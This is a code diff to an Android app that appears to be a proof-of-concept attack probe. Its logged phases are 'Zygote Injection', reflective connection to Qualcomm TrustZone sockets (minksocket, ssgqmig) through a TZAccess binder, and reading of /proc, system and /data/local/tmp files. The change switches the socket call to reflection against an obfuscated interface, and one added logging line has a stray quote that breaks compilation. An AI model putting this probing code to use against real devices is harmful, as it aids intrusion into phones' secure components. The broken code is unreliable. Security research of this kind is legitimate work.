@@ -23,7 +23,6 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
 import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
 import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
 import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
@@ -201,10 +200,10 @@ public class MainActivity extends AppCompatActivity {
         appendLog("========== PHASE 2: Zygote Injection ==========");
         testZygoteInjection();
 
-        appendLog("========== PHASE 3: TZAccess Socket Connect (AIDL) ==========");
+        appendLog("========== PHASE 3: TZAccess Socket Connect (Reflection) ==========");
         if (mTZServiceBinder != null) {
-            tryConnectViaTZAidl("/dev/socket/minksocket");
-            tryConnectViaTZAidl("/dev/socket/ssgqmig");
+            tryConnectViaTZReflect("/dev/socket/minksocket");
+            tryConnectViaTZReflect("/dev/socket/ssgqmig");
         }
 
         appendLog("========== PHASE 4: Deep File System Exploration ==========");
@@ -376,38 +375,35 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void tryConnectViaTZAidl(String path) {
-        appendLog("Trying TZAccess connect to " + path + " via AIDL");
+    private void tryConnectViaTZReflect(String path) {
+        appendLog("Trying TZAccess connect to " + path + " via reflection");
         if (mTZServiceBinder == null) {
             appendLog("  TZ binder null");
             return;
         }
         try {
-            IMinkSocketFd service = IMinkSocketFd.Stub.asInterface(mTZServiceBinder);
-            if (service == null) {
-                appendLog("  Failed to cast to IMinkSocketFd");
-                return;
-            }
+            // TZAccess の AIDL インターフェース名は com.qualcomm.qti.qms.api.a.IMinkSocketFd
+            Class<?> cls = Class.forName("com.qualcomm.qti.qms.api.a.IMinkSocketFd");
+            Method asInterface = cls.getMethod("asInterface", IBinder.class);
+            Object proxy = asInterface.invoke(null, mTZServiceBinder);
+            Method aMethod = cls.getMethod("a", String.class, int[].class);
             int[] iArr = new int[1];
-            ParcelFileDescriptor pfd = service.a(path, iArr);
+            ParcelFileDescriptor pfd = (ParcelFileDescriptor) aMethod.invoke(proxy, path, iArr);
             if (pfd != null) {
                 appendLog("  Got FD: " + iArr[0] + " for " + path);
                 pfd.close();
             } else {
-                appendLog("  Failed to get FD for " + path);
+                appendLog("  Failed to get FD for " + path");
             }
-        } catch (ClassCastException e) {
-            appendLog("  ClassCastException: " + e.getMessage());
-        } catch (RemoteException e) {
-            appendLog("  RemoteException: " + e.getMessage());
+        } catch (ClassNotFoundException e) {
+            appendLog("  IMinkSocketFd class not found. TZAccess may not be using this interface.");
         } catch (Exception e) {
-            appendLog("  Error: " + e.getMessage());
+            appendLog("  TZ connect error: " + e.getMessage());
         }
     }
 
     private void exploreDeepFiles() {
         appendLog("--- Deep File System Exploration ---");
-        // 既に読めた proc ファイルに加えて
         String[] additionalProc = {
             "/proc/self/fd",
             "/proc/self/cwd",
@@ -436,7 +432,6 @@ public class MainActivity extends AppCompatActivity {
             readFileContent(p);
         }
 
-        // 世界読み取り可能なシステムファイル
         String[] sysFiles = {
             "/system/build.prop",
             "/system/etc/hosts",
@@ -449,7 +444,6 @@ public class MainActivity extends AppCompatActivity {
             readFileContent(p);
         }
 
-        // /data/local/tmp 内のファイル一覧（読み取り不可だが、ディレクトリ一覧は取れる？前回は読めなかった）
         File tmpDir = new File("/data/local/tmp");
         if (tmpDir.exists() && tmpDir.canRead()) {
             appendLog("Reading /data/local/tmp contents:");
@@ -463,7 +457,6 @@ public class MainActivity extends AppCompatActivity {
             appendLog("/data/local/tmp not readable");
         }
 
-        // 書き込み可能な場所にテストファイルを作成（既にできている）
         File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
         if (download.exists() || download.mkdirs()) {
             File testFile = new File(download, "poc_write_test.txt");
